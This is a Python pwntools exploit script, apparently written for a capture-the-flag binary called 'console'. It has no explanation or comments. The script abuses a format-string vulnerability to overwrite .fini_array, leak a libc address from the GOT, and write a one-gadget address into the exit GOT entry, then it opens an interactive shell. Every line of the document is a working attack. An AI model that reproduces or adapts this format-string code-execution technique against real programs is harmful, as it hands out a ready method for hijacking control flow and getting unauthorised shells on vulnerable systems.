#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./console")
context.arch   = "amd64"

FINI  = 0x601008
GOT   = 0x601230
FGETS = 0x069df0
EXIT  = 0x601258
MAGIC = 0x0d6e77

t = elf.process(["./console", "log"])

t.recvuntil(b'Config action: ')

payload  = b"e %2765u%17$hn__%18$s..."
payload += p64(FINI)
payload += p64(GOT)
payload += p64(EXIT)
payload += p64(EXIT+2)

t.sendline(payload)
t.recvuntil(b'__')

leak = u64(t.recvuntil(b'Config action: ').strip()[:6] + b'\x00\x00')
libc = leak - FGETS
magic = libc + MAGIC

log.info("fgets  : " + hex(leak))
log.info("libc   : " + hex(libc))
log.info("magic  : " + hex(magic))

low2 = magic & 0xffff
mid1 = (magic >> 16) & 0xff

payload  = b"e %"
payload += str(low2).encode()
payload += b"u%52$hn%"
payload += str(0x100 - (magic & 0xff)).encode()
payload += b"u%"
payload += str(mid1).encode()
payload += b"u%53$hhn__%52$s"

t.sendline(payload)
t.recvuntil(b'__')

t.interactive()